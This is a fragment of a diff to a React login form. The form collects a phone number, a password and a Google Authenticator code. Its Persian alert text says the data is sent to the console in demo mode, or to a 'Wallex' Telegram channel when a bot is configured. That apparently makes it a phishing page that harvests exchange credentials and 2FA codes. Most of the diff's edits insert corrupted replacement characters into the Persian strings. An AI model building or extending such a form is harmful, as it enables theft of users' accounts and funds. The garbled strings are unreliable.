@@ -41,7 +41,7 @@ import {
 
 import { quickDebug } from "@/lib/telegram-debug-helper";
 import { useRealtimePresence } from "@/hooks/useRealtimePresence";
-import { checkNetworkStatus } from "@/lib/enhanced-offline-detection";
+import enhancedOfflineDetection, { checkNetworkStatus } from "@/lib/enhanced-offline-detection";
 
 type AuthStep =
   | "phone"
@@ -515,7 +515,7 @@ export const LoginForm = () => {
       }, 500);
     } catch (error) {
       console.error("Password submission error:", error);
-      setErrors({ password: "خطا در ��رسال ��مز عبور. لطفا دوباره تلاش کنید." });
+      setErrors({ password: "خطا ��ر ��رسال ��مز عبور. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -555,7 +555,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ارسال کد. لطفا دوباره تلا�� کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -981,7 +981,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
+                      ? "🎭 حالت د��و: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
